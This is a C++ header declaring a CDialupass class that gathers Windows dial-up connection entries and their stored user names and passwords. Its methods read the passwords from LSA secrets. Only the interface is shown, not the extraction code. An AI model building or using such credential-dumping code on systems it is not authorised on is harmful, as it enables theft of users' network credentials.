// Dialupass.h: interface for the CDialupass class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_DIALUPASS_H__B0BBD3E2_526C_4B10_A877_95E6D12F31D2__INCLUDED_)
#define AFX_DIALUPASS_H__B0BBD3E2_526C_4B10_A877_95E6D12F31D2__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include <windows.h>
#include <ras.h>
#include <raserror.h>
#include <shlobj.h>
#include <ntsecapi.h>
#pragma comment(lib, "rasapi32.lib")

enum
{
	STR_DialParamsUID = 0,
	STR_Name,
	STR_User,
	STR_Password,
	STR_PhoneNumber,
	STR_Device,
	STR_GUID,
	STR_MAX,
};



typedef struct
{
	TCHAR	UID[256];
	TCHAR	pass[256];
	TCHAR	login[256];
	TCHAR	GUID[256];
	BOOL	used;
}PASSWORDS, *PPASSWORDS;

class COneInfo{
private:
	TCHAR* Str[STR_MAX];

public:
	COneInfo(void)
	{
		ZeroMemory(Str, STR_MAX * (sizeof(TCHAR*)));
	}

	virtual ~COneInfo(void)
	{
		for (int i = 0; i < STR_MAX; i++){
			if (Str[i] != NULL)
				delete[] Str[i];
		}
	}

	void Set(int Kind, TCHAR *str)
	{
		if (str == NULL)
			return;
		if (Str[Kind] != NULL){
			delete[] Str[Kind];
		}
		Str[Kind] = new TCHAR[_tcslen(str) + 1];
		_tcscpy_s(Str[Kind], _tcslen(str) + 1, str);
	}
	TCHAR * Get(int Kind)
	{
		return Str[Kind];
	}
};

class CDialupass
{
public:
	CDialupass();
	virtual ~CDialupass();
	int GetMax(void){ return m_nMax; }
	COneInfo * GetOneInfo(int n){ return OneInfo[n]; }
	COneInfo* GetOneInfo(const GUID& guid);
private:
	int m_nMax;
	int m_nUsed;
	int m_nCount;
	int m_nRasCount;
	TCHAR *m_lpCurrentUser;
	COneInfo **OneInfo;
	PASSWORDS *m_PassWords;
	BOOL Set(TCHAR *DialParamsUID, TCHAR *Name, TCHAR *User, TCHAR *Password, TCHAR *PhoneNumber, TCHAR *Device, TCHAR* GUID);
	LPCTSTR UTF8ToGB2312(WCHAR UTF8Str[]);
	DWORD GetRasEntryCount();
	void GetLsaPasswords();
	void ParseLsaBuffer(LPCWSTR Buffer, USHORT Length);
	PLSA_UNICODE_STRING GetLsaData(LPTSTR KeyName);
	void StringToLsaStr(LPTSTR AValue, PLSA_UNICODE_STRING lsa);
	LPTSTR GetLocalSid();
	bool GetRasEntries();
};

#endif // !defined(AFX_DIALUPASS_H__B0BBD3E2_526C_4B10_A877_95E6D12F31D2__INCLUDED_)
